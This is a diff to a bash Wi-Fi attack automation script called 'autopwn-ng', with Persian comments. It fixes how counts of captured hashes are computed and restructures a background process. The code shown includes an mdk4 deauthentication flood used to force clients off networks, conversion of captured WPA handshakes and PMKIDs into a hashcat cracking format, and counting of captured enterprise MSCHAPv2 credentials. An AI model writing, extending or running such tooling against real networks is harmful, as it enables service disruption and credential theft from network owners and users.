@@ -25,6 +25,9 @@ AUTO=0
 RESUME=0
 WLIMIT=3
 CHECKPOINT="/tmp/autopwn-ng.checkpoint"
+PMKID_N=0
+EAPOL_N=0
+EAP_N=0
 WORK=""
 
 if [[ -t 1 ]]; then
@@ -283,7 +286,7 @@ fi
 
 # دِاوث دوره‌ای با mdk4 برای اجبار به reassociation
 if command -v mdk4 >/dev/null; then
-  ( sleep 5; mdk4 "$MON" d -b "$WORK/blacklist" >/dev/null 2>&1 ) &
+  ( sleep 5; exec mdk4 "$MON" d -b "$WORK/blacklist" ) >/dev/null 2>&1 &
   MDK_PID=$!
 fi
 
@@ -324,9 +327,12 @@ hcxhashtool -i "$WORK/raw.hc22000" -o "$HASH" --essid-group >/dev/null 2>&1 \
   || cp "$WORK/raw.hc22000" "$HASH" 2>/dev/null
 [ -s "$HASH" ] || { warn "هیچ هش WPA‌ای نبود."; : > "$HASH"; }
 
-PMKID_N=$(grep -c '^\*\*\*\*' "$HASH" 2>/dev/null || echo 0)
-EAPOL_N=$(grep -c 'WPA\*02' "$HASH" 2>/dev/null || echo 0)
-EAP_N=$(wc -l < "$WORK/mschapv2.txt" 2>/dev/null || echo 0)
+PMKID_N=$(grep -c '^\*\*\*\*' "$HASH" 2>/dev/null || true)
+EAPOL_N=$(grep -c 'WPA\*02' "$HASH" 2>/dev/null || true)
+EAP_N=$(wc -l < "$WORK/mschapv2.txt" 2>/dev/null || true)
+PMKID_N=${PMKID_N:-0}
+EAPOL_N=${EAPOL_N:-0}
+EAP_N=${EAP_N:-0}
 ok "PMKID: $PMKID_N | EAPOL: $EAPOL_N | Enterprise: $EAP_N"
 
   save_checkpoint 3
@@ -561,6 +567,12 @@ fi
 
 # ---------- گزارش ----------
 if [ "$SKIP_TO" -le 8 ]; then
+PMKID_N=$(grep -c '^\*\*\*\*' "$HASH" 2>/dev/null || true)
+EAPOL_N=$(grep -c 'WPA\*02' "$HASH" 2>/dev/null || true)
+EAP_N=$(wc -l < "$WORK/mschapv2.txt" 2>/dev/null || true)
+PMKID_N=${PMKID_N:-0}
+EAPOL_N=${EAPOL_N:-0}
+EAP_N=${EAP_N:-0}
 hr
 {
   echo "# گزارش autopwn-ng"
